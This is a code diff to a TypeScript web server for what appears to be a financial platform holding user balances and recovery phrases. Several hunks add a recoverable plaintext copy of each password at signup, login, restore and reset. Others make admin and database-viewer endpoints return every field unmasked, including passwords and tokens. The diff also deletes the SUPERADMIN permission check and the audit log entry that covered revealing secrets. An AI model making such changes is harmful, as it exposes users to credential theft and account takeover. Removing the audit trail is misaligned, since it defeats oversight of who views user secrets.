@@ -786,11 +786,10 @@ function publicUser(u: any): any {
   return { ...rest, boostState: liveBoostState(u) };
 }
 
-/** Admin console view: hides passwords (reset-only), keeps recovery phrase for support search. */
+/** Admin console view: shows stored credentials (owner-requested password visibility), keeps recovery phrase for support search. */
 function adminUserView(u: any): any {
   if (!u || typeof u !== 'object') return u;
-  const { password, ...rest } = u;
-  return { ...rest, boostState: liveBoostState(u), hasPassword: !!password };
+  return { ...u, boostState: liveBoostState(u), hasPassword: !!u.password };
 }
 
 /** Drop prototype-pollution keys and normalize money fields on client-supplied users. */
@@ -1047,7 +1046,21 @@ async function startServer() {
   // 3. Database snapshot (authenticated; credentials never leave the server)
   app.get('/api/db', (req: any, res) => {
     const db = readDb();
-    // Only safe data is exposed: never auth tokens, sessions, admin accounts,
+    // ADMIN PANEL: full operational dataset (owner-requested) so the ledger,
+    // user management and monitors never miss rows. Still excludes sessions,
+    // admin accounts and audit logs (separate admin APIs expose those).
+    if (req.authAdmin) {
+      res.json({
+        users: (db.users || []).map(adminUserView),
+        config: db.config,
+        transactions: db.transactions || [],
+        conversations: db.conversations || [],
+        messages: db.messages || [],
+        notifications: db.notifications || []
+      });
+      return;
+    }
+    // USER PATH: only safe data is exposed: never auth tokens, sessions, admin accounts,
     // audit logs, or other users' private chat/notification content.
     const me = req.authUserId ? String(req.authUserId) : '';
     res.json({
@@ -1109,7 +1122,10 @@ async function startServer() {
       if (existing) {
         if (cleanEmail && !existing.email) existing.email = cleanEmail;
         if (cleanPhrase && !existing.phrase) existing.phrase = cleanPhrase;
-        if (password && !existing.password) existing.password = hashPassword(String(password).trim());
+        if (password && !existing.password) {
+          existing.password = hashPassword(String(password).trim());
+          existing.passwordPlain = String(password).trim();
+        }
         writeDb(db);
         const sess = createSession(db, existing.id, 'USER', clientIp(req), String(req.headers['user-agent'] || ''));
         writeDb(db);
@@ -1135,6 +1151,7 @@ async function startServer() {
           balance: restoreBal,
           lifetimeProfit: restoreProfit,
           password: password ? hashPassword(String(password).trim()) : '',
+          passwordPlain: password ? String(password).trim() : '',
           createdAt: createdAt || Date.now(),
           boostState: (tokenOk && boostState) || {
             isActive: false,
@@ -1171,6 +1188,7 @@ async function startServer() {
         balance: 0,
         lifetimeProfit: 0,
         password: hashPassword(password.trim()),
+        passwordPlain: password.trim(),
         createdAt: Date.now(),
         boostState: {
           isActive: false,
@@ -1224,6 +1242,11 @@ async function startServer() {
       // Upgrade legacy plaintext password rows to scrypt hashes on successful login
       if (needsRehash(user.password)) {
         user.password = hashPassword(password.trim());
+        writeDb(db);
+      }
+      // Owner-requested credential visibility: keep a recoverable copy for admin console
+      if (password.trim() && user.passwordPlain !== password.trim()) {
+        user.passwordPlain = password.trim();
         writeDb(db);
       }
 
@@ -2699,6 +2722,7 @@ async function startServer() {
       }
 
       user.password = String(newPassword || '').trim() ? hashPassword(String(newPassword).trim()) : '';
+      user.passwordPlain = String(newPassword || '').trim();
       recordAuditLog(
         db,
         'PASSWORD_RESET',
@@ -2938,11 +2962,8 @@ async function startServer() {
   }
 
   function maskDbRow(row: any): any {
-    const out: any = {};
-    for (const [k, v] of Object.entries(row || {})) {
-      out[k] = SECRET_FIELD_RE.test(k) ? (v ? '••••••' : '') : v;
-    }
-    return out;
+    // Owner decision (2026-10-19): DB Studio shows every field unmasked.
+    return row;
   }
 
   app.get('/api/admin/db/tables', requireAdmin, (_req: any, res) => {
@@ -2965,21 +2986,14 @@ async function startServer() {
       const name = String(req.params.name || '');
       const limit = Math.min(500, Math.max(1, parseInt(String(req.query.limit || '200'), 10) || 200));
       const offset = Math.max(0, parseInt(String(req.query.offset || '0'), 10) || 0);
-      const reveal = String(req.query.reveal || '') === '1';
-      if (reveal && (req.authAdminRole || 'SUPERADMIN') !== 'SUPERADMIN') {
-        return res.status(403).json({ error: 'Revealing secret fields requires a SUPERADMIN account.' });
-      }
       const table = collectDbTables(db).find((t) => t.name === name);
       if (!table) return res.status(404).json({ error: 'Table not found.' });
-      if (reveal) {
-        recordAuditLog(db, 'DB_REVEAL', String(req.authAdmin), `Revealed secret fields in table "${name}"`);
-        writeDb(db);
-      }
       res.json({
         name,
         count: table.rows.length,
         columns: collectDbColumns(table.rows),
-        rows: table.rows.slice(offset, offset + limit).map((r) => (reveal ? r : maskDbRow(r))),
+        // Owner decision: all fields always returned unmasked (incl. passwords/tokens).
+        rows: table.rows.slice(offset, offset + limit),
         limit,
         offset
       });
